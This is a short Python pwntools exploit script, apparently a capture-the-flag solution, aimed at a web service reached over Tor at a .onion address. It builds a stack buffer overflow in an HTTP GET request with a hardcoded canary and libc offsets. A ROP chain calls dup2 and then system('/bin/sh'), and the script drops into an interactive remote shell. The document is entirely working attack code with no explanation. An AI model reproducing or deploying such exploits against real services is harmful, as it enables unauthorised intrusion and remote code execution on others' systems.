from pwn import *
import socks

s = socks.socksocket()
s.set_proxy(socks.SOCKS4, 'localhost', 9050)
s.connect(("xk5ubmdbh4esc3ny.onion", 80))

canary = "\x00\x26\x3d\x70\xb0\x21\x02\x7c"

p = remote.fromsocket(s)

write_plt = 0x400b70
write_got = 0x602218

write_libc = 0x7fa6f5a4ea00
write_offset = 0xf6a00

libc_base = write_libc - write_offset

system = libc_base + 0x45380
dup2 = libc_base + 0xf70c0
binsh = libc_base + 0x18c58b

pop_rdi = 0x401a73
pop_rsi_r15 = 0x401a71

payload = "GET /....// HTTP/1.1 "
payload += "A" * 376
payload += canary
payload += "BBBBBBBB"
payload += p64(pop_rdi)
payload += p64(0x5)
payload += p64(pop_rsi_r15)
payload += p64(0x0)
payload += p64(0x12345678)
payload += p64(dup2)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)

# p.recvline()
# p.recvline()
# p.recvline()

# leak = p.recv(8)
# log.info("0x" + leak.encode('hex'))

p.interactive()